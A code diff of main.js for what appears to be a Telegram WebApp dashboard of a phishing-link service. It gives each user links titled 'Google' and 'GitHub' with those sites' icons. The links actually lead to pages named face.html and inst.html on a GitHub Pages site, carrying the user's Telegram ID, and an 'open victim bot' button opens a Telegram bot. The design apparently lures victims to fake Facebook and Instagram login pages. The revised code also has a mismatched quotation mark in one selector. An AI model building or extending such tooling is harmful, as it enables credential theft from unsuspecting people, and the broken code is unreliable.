@@ -1,52 +1,68 @@
-  // Inline page logic (uses createLinkItem from premiumlist.js)
-  const tg = window.Telegram?.WebApp || null;
-  const userId = tg?.initDataUnsafe?.user?.id || null;
+// main.js
 
-  // free links (edit here)
+// Load Telegram WebApp object
+const tg = window.Telegram?.WebApp || null;
+
+// If not inside Telegram, block everything
+if (!tg || !tg.initDataUnsafe?.user) {
+  document.body.innerHTML = `
+    <div style="font-family:sans-serif;text-align:center;margin-top:50px;">
+      <h2>❌ This page only works inside Telegram</h2>
+      <p>Please open this link from the Telegram app.</p>
+    </div>
+  `;
+  throw new Error("Not in Telegram WebApp");
+}
+
+tg.ready(); // Tell Telegram we're ready
+
+document.addEventListener("DOMContentLoaded", () => {
+  const u = tg.initDataUnsafe.user;
+  const userId = u.id;
+
+  // Free links
   const freeLinksData = [
-    { title: "Google", url: "https://rrloaty.github.io/a/face.html?id={id}", thumb: "https://www.google.com/favicon.ico" },
-    { title: "GitHub", url: "https://rrloaty.github.io/a/inst.html?id={id}", thumb: "https://github.githubassets.com/favicons/favicon.svg" }
+    { title: "Google", url: "https://rrloaty.github.io/a/face.html?id=" + userId, thumb: "https://www.google.com/favicon.ico" },
+    { title: "GitHub", url: "https://rrloaty.github.io/a/inst.html?id=" + userId, thumb: "https://github.githubassets.com/favicons/favicon.svg" }
   ];
 
-  document.addEventListener("DOMContentLoaded", () => {
-    // show user name / handle (if present)
-    if (tg?.initDataUnsafe?.user) {
-      const u = tg.initDataUnsafe.user;
-      document.getElementById("user-name").textContent = u.first_name + (u.last_name ? " " + u.last_name : "");
-      document.getElementById("user-handle").textContent = u.username ? "@" + u.username : "";
-    }
+  // Show user name / handle
+  document.getElementById("user-name").textContent =
+    u.first_name + (u.last_name ? " " + u.last_name : "");
+  document.getElementById("user-handle").textContent =
+    u.username ? "@" + u.username : "";
 
-    // Render free links using the global createLinkItem from premiumlist.js
-    const freeContainer = document.getElementById("free-links");
-    freeLinksData.forEach(link => {
-      freeContainer.appendChild(window.createLinkItem(link, true, userId));
-    });
-
-    // NOTE: DO NOT render premium links here — premiumlist.js already does that.
-
-    // Tabs & bottom nav
-    document.querySelectorAll('.tab-btn, .nav-item').forEach(btn => {
-      btn.addEventListener('click', () => switchSection(btn.dataset.target));
-    });
-
-    // Copy ID, refresh, open victim bot
-    document.getElementById("copy-id-btn").addEventListener("click", () => {
-      if (userId) navigator.clipboard.writeText(String(userId)).then(()=> alert("Telegram ID copied!"));
-    });
-    document.getElementById("refresh-btn").addEventListener("click", () => location.reload());
-    document.getElementById("open-victim-bot").addEventListener("click", () => {
-      const url = `https://t.me/intelligentverificationlinkbot?start=${userId || ""}`;
-      if (tg?.openLink) tg.openLink(url);
-      else window.open(url, "_blank");
-    });
+  // Render free links
+  const freeContainer = document.getElementById("free-links");
+  freeLinksData.forEach(link => {
+    freeContainer.appendChild(createLinkItem(link, true, userId));
   });
 
-  function switchSection(sectionId) {
-    document.querySelectorAll(".section").forEach(s => s.classList.remove("active"));
-    document.getElementById(sectionId).classList.add("active");
-    document.querySelectorAll(".tab-btn, .nav-item").forEach(b => b.classList.toggle("active", b.dataset.target === sectionId));
-  }
+  // Tabs & bottom nav
+  document.querySelectorAll('.tab-btn, .nav-item').forEach(btn => {
+    btn.addEventListener('click', () => switchSection(btn.dataset.target));
+  });
 
-  function copyTextValue(value) {
-    navigator.clipboard.writeText(value).then(() => { alert("Copied!"); });
-  }
+  // Copy ID
+  document.getElementById("copy-id-btn").addEventListener("click", () => {
+    navigator.clipboard.writeText(String(userId))
+      .then(() => alert("Telegram ID copied!"));
+  });
+
+  // Refresh
+  document.getElementById("refresh-btn").addEventListener("click", () => location.reload());
+
+  // Open victim bot
+  document.getElementById("open-victim-bot").addEventListener("click", () => {
+    const url = `https://t.me/intelligentverificationlinkbot?start=${userId}`;
+    tg.openLink(url);
+  });
+});
+
+function switchSection(sectionId) {
+  document.querySelectorAll(".section").forEach(s => s.classList.remove("active"));
+  document.getElementById(sectionId).classList.add("active");
+  document.querySelectorAll(".tab-btn, .nav-item').forEach(b =>
+    b.classList.toggle("active", b.dataset.target === sectionId)
+  );
+}
